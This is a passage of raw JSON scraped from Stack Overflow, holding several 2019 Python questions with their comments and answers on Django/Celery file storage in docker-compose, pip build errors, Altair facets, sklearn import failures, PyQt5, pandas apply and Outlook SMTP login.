'/opt/api_webserver/media/organizations/1/data_sets/flow_cytometry/triple_hello_world_payload.tgz'.\nworker_1  | [2019-10-23 22:27:34,653: INFO/ForkPoolWorker-2] Task api.versions.v1.tasks.main_task.main_task[183916ca-f6e6-4e7c-a997-e8f516ccf8be] succeeded in 0.02647909999359399s: {'iteration': 0, 'completion': 0, 'status': 'ERROR', 'message': 'Excecuting `main_task` failed!', 'error': 'Error in `main_task`: [Errno 2] No such file or directory: \\'/opt/api_webserver/media/organizations/1/data_sets/flow_cytometry/triple_hello_world_payload.tgz\\'.'}\n</code></pre>\n\n<p>If I go into the <code>worker</code> <code>docker container</code> and check the file system the path does NOT exist for the <code>media</code> directory and file.<br>\nIf I go into the <code>api</code> <code>docker container</code> and check the file system the path does exist for the <code>media</code> directory and file.</p>\n\n<h1>Relevant Code</h1>\n\n<p>I won't be supplying view code, or api code, as the API works fine.</p>\n\n<p>Upload and file retrieval is handled in the <code>workers</code> process by using <code>django</code>'s <code>default_storage</code> interface.</p>\n\n<p><a href=\"https://docs.djangoproject.com/en/2.2/ref/files/storage/#the-storage-class\" rel=\"nofollow noreferrer\">Django's Default Storage Interface API</a></p>\n\n<p>The issue is related to the worker, so here is some of the related code.</p>\n\n<h2>worker.py</h2>\n\n<pre class=\"lang-py prettyprint-override\"><code># Python Standard Libraries\nimport os\n# Third-Party Libraries\nimport tempfile\n# Custom\nfrom models.data_set_model import DataSet\nfrom tasks.helpers import download_remote_file\n\n\ndef download_data_set(data_set_id):\n    print(\"Downloading the files required to run!\")\n    data_set = DataSet.objects.get(id=data_set_id)\n\n    remote_file_path = data_set.file.name\n    remote_file_name = os.path.basename(remote_file_path)\n\n    temporary_directory_path = tempfile.mkdtemp()\n    temporary_compressed_file_path = os.path.join(temporary_directory_path, remote_file_name)\n\n    download_remote_file(remote_file_path, temporary_compressed_file_path)\n\n    return temporary_compressed_file_path\n</code></pre>\n\n<h2>helpers.py</h2>\n\n<pre class=\"lang-py prettyprint-override\"><code># Python Standard Libraries\n# N/A\n# Third-Party Libraries\nfrom django.core.files.storage import default_storage\n# CustomLibraries\n# N/A\n\n\ndef download_remote_file(remote_file_path, local_file_path):\n    print(f\"Downloading remote file `{remote_file_path}`\")\n    print(f\"Exists: `{default_storage.exists(remote_file_path)}`\")\n    remote_file_contents = None\n    with default_storage.open(remote_file_path) as remote_file_handle:\n        print(\"Reading file contents\")\n        remote_file_contents = remote_file_handle.read()\n\n    print(f\"Placing remote file contents into `{local_file_path}`\")\n    with open(local_file_path, \"wb\") as local_file_handle:\n        local_file_handle.write(remote_file_contents)\n</code></pre>\n\n<h1>Outstanding Questions</h1>\n\n<ul>\n<li>What am I doing wrong?</li>\n<li>What is the idiomatic way to download files on the worker from the API's FileStorage system?</li>\n<li>Shouldn't the <code>default_storage.open()</code> command point to the API's file system and be able to download it\n\n<ul>\n<li>If it isn't are there configurations I can make on the worker to support this?</li>\n</ul></li>\n<li>Does this only work locally because the file system is shared, and the reason this is happening is because <code>docker-compose</code> is breaking these into separate environments?</li>\n</ul>\n"}, {"tags": ["python", "pip"], "comments": [{"owner": {"reputation": 1068, "user_id": 7211815, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6qt3B.png?s=128&g=1", "display_name": "codrelphi", "link": "https://stackoverflow.com/users/7211815/codrelphi"}, "edited": false, "score": 1, "creation_date": 1571871482, "post_id": 58531943, "comment_id": 103387628, "body": "please, show the commands you are using.."}, {"owner": {"reputation": 2002, "user_id": 1896134, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/72817a5f0bd7c29704bbe5c04cd49532?s=128&d=identicon&r=PG", "display_name": "JayRizzo", "link": "https://stackoverflow.com/users/1896134/jayrizzo"}, "edited": false, "score": 3, "creation_date": 1571871760, "post_id": 58531943, "comment_id": 103387713, "body": "Add <code>--with-debug</code> to your install command and paste the output to your question."}, {"owner": {"reputation": 37796, "user_id": 2650249, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/RBWDR.jpg?s=128&g=1", "display_name": "hoefling", "link": "https://stackoverflow.com/users/2650249/hoefling"}, "edited": false, "score": 3, "creation_date": 1571872190, "post_id": 58531943, "comment_id": 103387798, "body": "The <i>bunch of running/creating/copying/building in red</i> is the crucial part - please add it to the question."}], "owner": {"reputation": 21, "user_id": 12265833, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mD5tgXYGFtsADGJH_7lRerVhfWwbmVleX1JIXcP=k-s128", "display_name": "Patrick Voorhoeve", "link": "https://stackoverflow.com/users/12265833/patrick-voorhoeve"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 686, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1571871223, "creation_date": 1571871223, "question_id": 58531943, "link": "https://stackoverflow.com/questions/58531943/pip-install-error-failed-building-wheel-for-wordcloud", "title": "Pip install: ERROR: failed building wheel for wordcloud", "body": "<p>I'm trying to install a package via pip, howver it keeps exiting with </p>\n\n<p><code>ERROR: Command errored out with exit status 1</code></p>\n\n<p>then a bunch of running/creating/copying/building in red then:</p>\n\n<p><code>ERROR: Failed building wheel for word</code> </p>\n\n<p>basicallly it fails to build and install the package and I cannot for the life of my figure out why.</p>\n"}, {"tags": ["python", "altair"], "answers": [{"comments": [{"owner": {"reputation": 5318, "user_id": 1877744, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/dcfca09112111f08a8020dca981ac2a9?s=128&d=identicon&r=PG", "display_name": "Jd Baba", "link": "https://stackoverflow.com/users/1877744/jd-baba"}, "edited": false, "score": 0, "creation_date": 1571893872, "post_id": 58533056, "comment_id": 103391971, "body": "+1 Awesome thank you so much. I was not aware of this option. I am learning altair is the most intuitive visualization library in python. Especially after coming from R world altair has been life saver. Also is there a way to visualize altair in pycharm / spyder ?"}, {"owner": {"reputation": 52229, "user_id": 2937831, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/56c4053438af8e8b90d6f53cbb7573be?s=128&d=identicon&r=PG", "display_name": "jakevdp", "link": "https://stackoverflow.com/users/2937831/jakevdp"}, "reply_to_user": {"reputation": 5318, "user_id": 1877744, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/dcfca09112111f08a8020dca981ac2a9?s=128&d=identicon&r=PG", "display_name": "Jd Baba", "link": "https://stackoverflow.com/users/1877744/jd-baba"}, "edited": false, "score": 1, "creation_date": 1571895341, "post_id": 58533056, "comment_id": 103392381, "body": "<a href=\"https://altair-viz.github.io/user_guide/faq.html#does-altair-work-with-ipython-terminal-pycharm-spyder-my-favorite-ide\" rel=\"nofollow noreferrer\">altair-viz.github.io/user_guide/&hellip;</a>"}], "tags": [], "owner": {"reputation": 52229, "user_id": 2937831, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/56c4053438af8e8b90d6f53cbb7573be?s=128&d=identicon&r=PG", "display_name": "jakevdp", "link": "https://stackoverflow.com/users/2937831/jakevdp"}, "is_accepted": true, "score": 3, "last_activity_date": 1571881831, "creation_date": 1571881831, "answer_id": 58533056, "question_id": 58531937, "link": "https://stackoverflow.com/questions/58531937/altair-yaxis-limits-free/58533056#58533056", "title": "Altair yaxis limits free", "body": "<p>You can use the <code>resolve_scale</code> setting to control whether scales within compound charts are shared or independent. By default, scales are shared:</p>\n\n<pre><code>alt.Chart(sum_tf).mark_line().encode(\n    x='month:Q',\n    y='value:Q',\n).properties(\n    width=600,\n    height=100\n).facet(\n    facet='variable:O',\n    columns=1\n).resolve_scale(\n    y='independent'\n)\n</code></pre>\n\n<p>More information and examples in the docs here: <a href=\"https://altair-viz.github.io/user_guide/scale_resolve.html\" rel=\"nofollow noreferrer\">https://altair-viz.github.io/user_guide/scale_resolve.html</a></p>\n"}], "owner": {"reputation": 5318, "user_id": 1877744, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/dcfca09112111f08a8020dca981ac2a9?s=128&d=identicon&r=PG", "display_name": "Jd Baba", "link": "https://stackoverflow.com/users/1877744/jd-baba"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 631, "favorite_count": 1, "accepted_answer_id": 58533056, "answer_count": 1, "score": 1, "last_activity_date": 1571881831, "creation_date": 1571871190, "last_edit_date": 1571881827, "question_id": 58531937, "link": "https://stackoverflow.com/questions/58531937/altair-yaxis-limits-free", "title": "Altair yaxis limits free", "body": "<p>I am trying to play with altair python visualization library and got the facet function working. However, in the plot all the facets have same y-lim. I want to know if it is possible to implement similar to ggplot2 facet(~column, scales = \"free\"). Is there a way to implement scales == \"free\" in altair ? I looked at the documentation and I saw that there aren't other variables that I can adjust. </p>\n\n<p>The code that I am using is as follows: </p>\n\n<pre><code>alt.Chart(sum_tf).mark_line().encode(\n    x='month:Q',\n    y='value:Q',\n).properties(\n    width=600,\n    height=100\n).facet(\n    facet='variable:O',\n    columns=1\n)\n</code></pre>\n"}, {"tags": ["python", "scikit-learn"], "owner": {"reputation": 109, "user_id": 9319093, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f229fc107f83b1c78fc77c1ab947918?s=128&d=identicon&r=PG&f=1", "display_name": "Omkar", "link": "https://stackoverflow.com/users/9319093/omkar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 134, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1571871091, "creation_date": 1571871091, "question_id": 58531921, "link": "https://stackoverflow.com/questions/58531921/unable-to-import-any-model-from-sklearn", "title": "Unable to import any model from sklearn", "body": "<p>Newbie to Machine Learning and Python. None of the model under sklearn can be imported. It was working few days back. But then I updated anaconda since then facing OS Error issue. Where Am i going wrong?</p>\n\n<p>Thanks in advance</p>\n\n<p>I am using Jupyter Notebook python3.6, Win 10. \nI tried</p>\n\n<pre><code>import sklearn\nassert sklearn.__version__ &gt;= \"0.20\"\n</code></pre>\n\n<p>I upgraded all Libraries which exceed mentioned on documentation:\nsklearn  0.21.3</p>\n\n<p>numpy  1.16.5</p>\n\n<p>scipy  1.3.1</p>\n\n<p>joblib 0.13.2</p>\n\n<p>I reinstalled Anaconda, Python, remove the root directories under 'User' folder</p>\n\n<p>Also read \n<a href=\"https://stackoverflow.com/questions/40615021/cannot-import-sklearn-model-selection-in-scikit-learn\">Cannot import sklearn.model_selection in scikit-learn</a></p>\n\n<pre><code>from sklearn.model_selection import train_test_split\nOSError Traceback (most recent call last)\n&lt;ipython-input-3-73edc048c06b&gt; in &lt;module&gt;\n----&gt; 1 from sklearn.model_selection import train_test_split\n\n~\\Anaconda3\\lib\\site-packages\\sklearn\\model_selection\\__init__.py in \n &lt;module&gt;\n 17 from ._split import check_cv\n 18 \n---&gt; 19 from ._validation import cross_val_score\n 20 from ._validation import cross_val_predict\n 21 from ._validation import cross_validate\n\n~\\Anaconda3\\lib\\site-packages\\sklearn\\model_selection\\_validation.py in \n&lt;module&gt;\n 25 from ..utils.metaestimators import _safe_split\n 26 from ..utils._joblib import Parallel, delayed\n---&gt; 27 from ..metrics.scorer import check_scoring, \n_check_multimetric_scoring\n 28 from ..exceptions import FitFailedWarning\n 29 from ._split import check_cv\n\n~\\Anaconda3\\lib\\site-packages\\sklearn\\metrics\\__init__.py in &lt;module&gt;\n  5 \n  6 \n----&gt; 7 from .ranking import auc\n  8 from .ranking import average_precision_score\n  9 from .ranking import coverage_error\n\n~\\Anaconda3\\lib\\site-packages\\sklearn\\metrics\\ranking.py in &lt;module&gt;\n 33 from ..utils.sparsefuncs import count_nonzero\n 34 from ..exceptions import UndefinedMetricWarning\n---&gt; 35 from ..preprocessing import label_binarize\n 36 \n 37 from .base import _average_binary_score\n\n~\\Anaconda3\\lib\\site-packages\\sklearn\\preprocessing\\__init__.py in &lt;module&gt;\n  4 \"\"\"\n  5 \n----&gt; 6 from ._function_transformer import FunctionTransformer\n  7 \n  8 from .data import Binarizer\n\n~\\Anaconda3\\lib\\site\npackages\\sklearn\\preprocessing\\_function_transformer.py in &lt;module&gt;\n  3 from ..base import BaseEstimator, TransformerMixin\n  4 from ..utils import check_array\n----&gt; 5 from ..utils.testing import assert_allclose_dense_sparse\n  6 \n  7 \n\n~\\Anaconda3\\lib\\site-packages\\sklearn\\utils\\testing.py in &lt;module&gt;\n716 \n717 try:\n--&gt; 718     import pytest\n719 \n720     skip_if_32bit = pytest.mark.skipif(_IS_32BIT,\n\n~\\Anaconda3\\lib\\site-packages\\pytest.py in &lt;module&gt;\n  4 \"\"\"\n  5 from _pytest import __version__\n----&gt; 6 from _pytest.assertion import register_assert_rewrite\n  7 from _pytest.config import cmdline\n  8 from _pytest.config import hookimpl\n\n~\\Anaconda3\\lib\\site-packages\\_pytest\\assertion\\__init__.py in &lt;module&gt;\n  5 from typing import Optional\n  6 \n   7 from _pytest.assertion import rewrite\n  8 from _pytest.assertion import truncate\n  9 from _pytest.assertion import util\n\n~\\Anaconda3\\lib\\site-packages\\_pytest\\assertion\\rewrite.py in &lt;module&gt;\n 24 from _pytest._io.saferepr import saferepr\n 25 from _pytest._version import version\n---&gt; 26 from _pytest.assertion import util\n 27 from _pytest.assertion.util import (  # noqa: F401\n 28     format_explanation as _format_explanation,\n\n~\\Anaconda3\\lib\\site-packages\\_pytest\\assertion\\util.py in\n&lt;module&gt;\n  6 from typing import Optional\n  7 \n----&gt; 8 import _pytest._code\n  9 from _pytest import outcomes\n 10 from _pytest._io.saferepr import saferepr\n\n~\\Anaconda3\\lib\\site-packages\\_pytest\\_code\\__init__.py in &lt;module&gt;\n  1 \"\"\" python inspection/code generation API \"\"\"\n----&gt; 2 from .code import Code  # noqa\n  3 from .code import ExceptionInfo  # noqa\n  4 from .code import filter_traceback  # noqa\n  5 from .code import Frame  # noqa\n\n~\\Anaconda3\\lib\\site-packages\\_pytest\\_code\\code.py in &lt;module&gt;\n 21 \n 22 import attr\n---&gt; 23 import pluggy\n 24 import py\n 25 \n\n~\\Anaconda3\\lib\\site-packages\\pluggy\\__init__.py in &lt;module&gt;\n 14 ]\n 15 \n---&gt; 16 from .manager import PluginManager, PluginValidationError\n 17 from .callers import HookCallError\n 18 from .hooks import HookspecMarker, HookimplMarker\n\n~\\Anaconda3\\lib\\site-packages\\pluggy\\manager.py in &lt;module&gt;\n  9     from importlib import metadata as importlib_metadata\n 10 else:\n---&gt; 11     import importlib_metadata\n 12 \n 13 \n\n~\\Anaconda3\\lib\\site-packages\\importlib_metadata\\__init__.py in &lt;module&gt;\n545 \n546 \n--&gt; 547 __version__ = version(__name__)\n\n~\\Anaconda3\\lib\\site-packages\\importlib_metadata\\__init__.py in version(distribution_name)\n507         \"Version\" metadata key.\n508     \"\"\"\n--&gt; 509     return distribution(distribution_name).version\n510 \n511 \n\n~\\Anaconda3\\lib\\site-packages\\importlib_metadata\\__init__.py in distribution(distribution_name)\n480     :return: A ``Distribution`` instance (or subclass thereof).\n481     \"\"\"\n--&gt; 482     return Distribution.from_name(distribution_name)\n483 \n484 \n\n~\\Anaconda3\\lib\\site-packages\\importlib_metadata\\__init__.py in from_name(cls, name)\n181             context = DistributionFinder.Context(name=name)\n182             dists = cls._maybe_bind(resolver, context)\n--&gt; 183             dist = next(dists, None)\n184             if dist is not None:\n185                 return dist\n\n~\\Anaconda3\\lib\\site-packages\\importlib_metadata\\__init__.py in &lt;genexpr&gt;(.0)\n423         return itertools.chain.from_iterable(\n424             cls._search_path(path, pattern)\n--&gt; 425             for path in map(cls._switch_path, paths)\n426             )\n427 \n\n~\\Anaconda3\\lib\\site-packages\\importlib_metadata\\__init__.py in _search_path(cls, root, pattern)\n447     @classmethod\n448     def _search_path(cls, root, pattern):\n--&gt; 449         if not root.is_dir():\n450             return ()\n451         normalized = pattern.replace('-', '_')\n\n~\\Anaconda3\\lib\\pathlib.py in is_dir(self)\n   1356         \"\"\"\n   1357         try:\n-&gt; 1358             return S_ISDIR(self.stat().st_mode)\n   1359         except OSError as e:\n   1360             if not _ignore_error(e):\n\n~\\Anaconda3\\lib\\pathlib.py in stat(self)\n   1166         os.stat() does.\n   1167         \"\"\"\n-&gt; 1168         return self._accessor.stat(self)\n   1169 \n   1170     def owner(self):\n\nOSError: [WinError 123] The filename, directory name, or volume label syntax is incorrect:\n'C:\\\\Users\\\\Omkar\\\\$SPARK_HOME\\\\python:$SPARK_HOME\\\\python\\\\lib\\\\py4j-VERSION-src.zip:$PYTHONPATH' ```\n</code></pre>\n"}, {"tags": ["python", "module", "pyqt5", "python-import"], "comments": [{"owner": {"reputation": 2103, "user_id": 7554868, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-_q0V6XZcS5c/AAAAAAAAAAI/AAAAAAAABeM/Bmdf1MpnjTQ/photo.jpg?sz=128", "display_name": "Jammy Dodger", "link": "https://stackoverflow.com/users/7554868/jammy-dodger"}, "edited": false, "score": 0, "creation_date": 1571871461, "post_id": 58531910, "comment_id": 103387625, "body": "How have you install it?"}, {"owner": {"reputation": 419, "user_id": 9195617, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/587966bbb465b10441f1369c1d666d09?s=128&d=identicon&r=PG&f=1", "display_name": "vcable", "link": "https://stackoverflow.com/users/9195617/vcable"}, "reply_to_user": {"reputation": 2103, "user_id": 7554868, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-_q0V6XZcS5c/AAAAAAAAAAI/AAAAAAAABeM/Bmdf1MpnjTQ/photo.jpg?sz=128", "display_name": "Jammy Dodger", "link": "https://stackoverflow.com/users/7554868/jammy-dodger"}, "edited": false, "score": 0, "creation_date": 1571871767, "post_id": 58531910, "comment_id": 103387714, "body": "<code>pip3 install PyQt5</code>, and I confirmed that it is installed"}, {"owner": {"reputation": 360, "user_id": 12233973, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EoF3C.jpg?s=128&g=1", "display_name": "c_sagan", "link": "https://stackoverflow.com/users/12233973/c-sagan"}, "edited": false, "score": 1, "creation_date": 1571873890, "post_id": 58531910, "comment_id": 103388126, "body": "Possible answered in this <a href=\"https://stackoverflow.com/questions/56726580/no-name-qapplication-in-module-pyqt5-qtwidgets-error-in-pylint\">StackOverflow question</a>."}, {"owner": {"reputation": 419, "user_id": 9195617, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/587966bbb465b10441f1369c1d666d09?s=128&d=identicon&r=PG&f=1", "display_name": "vcable", "link": "https://stackoverflow.com/users/9195617/vcable"}, "reply_to_user": {"reputation": 360, "user_id": 12233973, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EoF3C.jpg?s=128&g=1", "display_name": "c_sagan", "link": "https://stackoverflow.com/users/12233973/c-sagan"}, "edited": false, "score": 0, "creation_date": 1571874276, "post_id": 58531910, "comment_id": 103388195, "body": "Thanks @c_sagan, that worked!"}], "owner": {"reputation": 419, "user_id": 9195617, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/587966bbb465b10441f1369c1d666d09?s=128&d=identicon&r=PG&f=1", "display_name": "vcable", "link": "https://stackoverflow.com/users/9195617/vcable"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 34, "favorite_count": 0, "closed_date": 1571875573, "answer_count": 0, "score": 0, "last_activity_date": 1571873407, "creation_date": 1571871012, "last_edit_date": 1571873407, "question_id": 58531910, "link": "https://stackoverflow.com/questions/58531910/cant-import-python-module-i-just-installed", "closed_reason": "Duplicate", "title": "Can&#39;t import Python module I just installed", "body": "<p>I just installed PyQt5 using pip3.  When I try and import it, this doesn't throw any errors:</p>\n\n<p><code>from PyQt5.QtWidgets import *</code></p>\n\n<p>However, when I try and actually access the library:</p>\n\n<p><code>app = QApplication(sys.argv)</code></p>\n\n<p>I get the \"Undefined Variable\" error on <code>QApplication</code>.</p>\n\n<p>I've also tried importing like this:</p>\n\n<p><code>from PyQt5.QtWidgets import QApplication</code></p>\n\n<p>which gives me the <code>\"No Name QApplication in Module\"</code> error.  </p>\n\n<p>This is frustrating me to no end, since I literally just installed the library, AND when I type in the import commands my IDE gives me predictive text, showing that the library is being detected.</p>\n"}, {"tags": ["python", "python-3.x"], "comments": [{"owner": {"reputation": 2389, "user_id": 7348030, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7PmbNFJwfPc/AAAAAAAAAAI/AAAAAAAAAJE/5lDuTFQtNpQ/photo.jpg?sz=128", "display_name": "Florian Bernard", "link": "https://stackoverflow.com/users/7348030/florian-bernard"}, "edited": false, "score": 0, "creation_date": 1571871261, "post_id": 58531902, "comment_id": 103387588, "body": "What is player_data?"}, {"owner": {"reputation": 11, "user_id": 12265791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/228209e9486905bbd4ac539f0fadaeff?s=128&d=identicon&r=PG&f=1", "display_name": "greasykeys", "link": "https://stackoverflow.com/users/12265791/greasykeys"}, "reply_to_user": {"reputation": 2389, "user_id": 7348030, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7PmbNFJwfPc/AAAAAAAAAAI/AAAAAAAAAJE/5lDuTFQtNpQ/photo.jpg?sz=128", "display_name": "Florian Bernard", "link": "https://stackoverflow.com/users/7348030/florian-bernard"}, "edited": false, "score": 0, "creation_date": 1571871399, "post_id": 58531902, "comment_id": 103387616, "body": "Should&#39;ve provided more context. It is a csv file; player_data is the list of all the data."}, {"owner": {"reputation": 2389, "user_id": 7348030, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7PmbNFJwfPc/AAAAAAAAAAI/AAAAAAAAAJE/5lDuTFQtNpQ/photo.jpg?sz=128", "display_name": "Florian Bernard", "link": "https://stackoverflow.com/users/7348030/florian-bernard"}, "edited": false, "score": 0, "creation_date": 1571871581, "post_id": 58531902, "comment_id": 103387660, "body": "could you show the format of player_data?"}, {"owner": {"reputation": 11, "user_id": 12265791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/228209e9486905bbd4ac539f0fadaeff?s=128&d=identicon&r=PG&f=1", "display_name": "greasykeys", "link": "https://stackoverflow.com/users/12265791/greasykeys"}, "reply_to_user": {"reputation": 2389, "user_id": 7348030, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7PmbNFJwfPc/AAAAAAAAAAI/AAAAAAAAAJE/5lDuTFQtNpQ/photo.jpg?sz=128", "display_name": "Florian Bernard", "link": "https://stackoverflow.com/users/7348030/florian-bernard"}, "edited": false, "score": 0, "creation_date": 1571871894, "post_id": 58531902, "comment_id": 103387739, "body": "I just posted a picture at the bottom of the post that will show the first few entries of the file. Thanks!"}], "answers": [{"tags": [], "owner": {"reputation": 2389, "user_id": 7348030, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7PmbNFJwfPc/AAAAAAAAAAI/AAAAAAAAAJE/5lDuTFQtNpQ/photo.jpg?sz=128", "display_name": "Florian Bernard", "link": "https://stackoverflow.com/users/7348030/florian-bernard"}, "is_accepted": false, "score": 0, "last_activity_date": 1571873109, "creation_date": 1571873109, "answer_id": 58532171, "question_id": 58531902, "link": "https://stackoverflow.com/questions/58531902/how-do-i-find-the-max-age-from-a-csv-file-and-then-return-that-persons-name/58532171#58532171", "title": "How do I find the max age from a csv file and then return that person&#39;s name?", "body": "<p>You can try something like this.</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>max_player = sorted(player_data, key=lambda c : x[2])\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 12265791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/228209e9486905bbd4ac539f0fadaeff?s=128&d=identicon&r=PG&f=1", "display_name": "greasykeys", "link": "https://stackoverflow.com/users/12265791/greasykeys"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 68, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1571873109, "creation_date": 1571870954, "last_edit_date": 1571871483, "question_id": 58531902, "link": "https://stackoverflow.com/questions/58531902/how-do-i-find-the-max-age-from-a-csv-file-and-then-return-that-persons-name", "title": "How do I find the max age from a csv file and then return that person&#39;s name?", "body": "<p>The title pretty much sums up my issue. Here's the code I've got so far:</p>\n\n<pre><code>def oldest_player(): #what is the name of the oldest player?\n    for i in player_data:\n        row_idx = player_data.index(i)\n        age_list = []\n        zero_age = 0\n        if cell(row_idx, \"Age\") &gt; zero_age:\n            if cell(row_idx, \"Age\") &gt; age_list[0]:\n                curr_age = cell(row_idx, \"Age\")\n                age_list.clear()\n                age_list.append(curr_age)\n            else:\n                continue\n        return age_list\n\noldest_player()\n</code></pre>\n\n<p><strong>More or less, I'm asking how to find the max value of a column in a csv file, and then how to return a name that corresponds with that data entry.</strong></p>\n\n<p>Thank you!</p>\n\n<p>EDIT:\nHere is a picture of the data that \"player_data\" is referring to:</p>\n\n<p><a href=\"https://i.stack.imgur.com/mQzQH.png\" rel=\"nofollow noreferrer\">player_data</a></p>\n"}, {"tags": ["python", "pandas", "dataframe", "apply", "series"], "answers": [{"tags": [], "owner": {"reputation": 22982, "user_id": 10189214, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-oTTBaX3HSZQ/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7ohHVatc4khqXgYvNrBM40bMFj71Q/mo/photo.jpg?sz=128", "display_name": "Andy L.", "link": "https://stackoverflow.com/users/10189214/andy-l"}, "is_accepted": true, "score": 1, "last_activity_date": 1571871320, "creation_date": 1571871320, "answer_id": 58531952, "question_id": 58531856, "link": "https://stackoverflow.com/questions/58531856/pandas-apply-function-when-database-is-the-2nd-positional-argument/58531952#58531952", "title": "Pandas apply function when database is the 2nd positional argument", "body": "<p>If you are not allowed to modify function <code>fun</code>, you need additional lambda inside <code>apply</code> as follows:</p>\n\n<pre><code>df.apply(lambda col: fun(10, col))\n</code></pre>\n"}], "owner": {"reputation": 367, "user_id": 6598627, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207007656136117/picture?type=large", "display_name": "Travasaurus", "link": "https://stackoverflow.com/users/6598627/travasaurus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 62, "favorite_count": 0, "accepted_answer_id": 58531952, "answer_count": 1, "score": 2, "last_activity_date": 1571873501, "creation_date": 1571870615, "question_id": 58531856, "link": "https://stackoverflow.com/questions/58531856/pandas-apply-function-when-database-is-the-2nd-positional-argument", "title": "Pandas apply function when database is the 2nd positional argument", "body": "<p>Lets say I have a function </p>\n\n<pre><code>def fun(x, y):\n    return(y.sum() + x)\n</code></pre>\n\n<p>This function takes in a value to add <strong>x</strong>, and a database/series to sum <strong>y</strong></p>\n\n<p>If I have a database <strong>df</strong>, that I would like to apply my function to. However, the data base is meant to be the second positional argument not the first.</p>\n\n<pre><code>df.apply(fun, x = 10)\n</code></pre>\n\n<p>returns an error <strong>\"(\"fun() got multiple values for argument 'x'\", 'occurred at index 0')</strong></p>\n\n<p>How do I use the apply function so that the database is the <strong>second</strong> positional argument?</p>\n"}, {"tags": ["python", "outlook", "smtp", "smtp-auth"], "comments": [{"owner": {"reputation": 544, "user_id": 3372006, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73892eb672f05f8d2773cff6fa0b5980?s=128&d=identicon&r=PG&f=1", "display_name": "xiaxio", "link": "https://stackoverflow.com/users/3372006/xiaxio"}, "edited": false, "score": 0, "creation_date": 1571874343, "post_id": 58531797, "comment_id": 103388209, "body": "I just tried the code section that has to do with sending the email, from an outlook address to a gmail address and it works fine"}], "owner": {"reputation": 455, "user_id": 9294109, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b826e185441a4179773686734d17b8cd?s=128&d=identicon&r=PG&f=1", "display_name": "Seeker90", "link": "https://stackoverflow.com/users/9294109/seeker90"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 93, "favorite_count": 1, "answer_count": 0, "score": 1, "last_activity_date": 1571870083, "creation_date": 1571870083, "question_id": 58531797, "link": "https://stackoverflow.com/questions/58531797/cannot-send-status-email-to-outlook-mail-from-python", "title": "Cannot send status email to outlook mail from python", "body": "<p>I am trying to check the status of websites and send the status to outlook mail. This is what I have done -</p>\n\n<pre><code>import requests.exceptions\n\nSITES = [\"https://example1.com\",\"https://example2.com\"]\n\nfor site in SITES:\n    try:\n        r = requests.get(site)\n        r.raise_for_status()  \n    except requests.exceptions.ConnectionError as err:\n        print(\"Connection Error in \" + site + \":\" + \"err\")\n    except requests.exceptions.Timeout as err:\n        print(\"Timeout Error in \" + site + \":\" + \"err\")\n    except requests.exceptions.HTTPError as err:\n        print(\"HTTP Error in \" + site + \":\" + \"err\")\n        import smtplib\n        from email.mime.multipart import MIMEMultipart\n        from email.mime.text import MIMEText\n\n        fromaddr = \"example@outlook.com\"\n        toaddr = \"example2@outlook.com\"\n        msg = MIMEMultipart()\n        msg['From'] = fromaddr\n        msg['To'] = toaddr\n        msg['Subject'] = \"Alert: Server Room  \"\n        body = \"HTTP error in  : \" + site \n        msg.attach(MIMEText(body, 'plain'))\n        server = smtplib.SMTP('smtp.outlook.com', 587)\n        server.starttls()\n        server.login(fromaddr, \"password\")\n        text = msg.as_string()\n        server.sendmail(fromaddr, toaddr, text)\n        server.quit()\n\n    else:\n        print(site + \"is working\")\n\n</code></pre>\n\n<p>I am using Python 3.7.4. I get this error -</p>\n\n<pre><code>    raise SMTPAuthenticationError(code, resp)\nsmtplib.SMTPAuthenticationError: (535, b'5.7.3 Authentication unsuccessful [AM4P190CA0003.EURP190.PROD.OUTLOOK.COM]')\n</code></pre>\n\n<p>I am giving the correct email address and password. What is the fix ?</p>\n"}, {"tags": ["python", "json", 